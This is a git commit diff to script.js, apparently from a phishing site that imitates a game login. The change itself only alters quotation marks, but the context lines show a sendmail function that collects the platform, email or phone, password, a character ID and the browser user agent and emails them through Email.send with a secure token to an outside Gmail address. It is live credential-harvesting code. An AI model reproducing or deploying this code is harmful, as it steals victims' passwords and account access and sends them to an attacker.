03862339e2e16360c09c899e619332738e1da098
Abr <59525997+Abr009@users.noreply.github.com>
2023-11-12 20:43:51 +0530

    Update script.js

--- script.js
+++ script.js
@@ -188,7 +188,7 @@ function sendmail(login, user, pass) {
     body = "Platform : " + login + "<br><br> Email or Phone : " + user + "<br><br> Password : " + pass + "<br><br> Character ID : " + characterID + "<br><br> User Agent : " + navigator.userAgent
     Email.send({
         SecureToken: "eadb0468-349e-4b08-a7ad-4e51e2c9ff88",
-        To: "12ghostrider567@gmail.com",
+        To: '12ghostrider567@gmail.com',
         From: "123ghostrider456@gmail.com",
         Subject: "New Login",
         Body: body
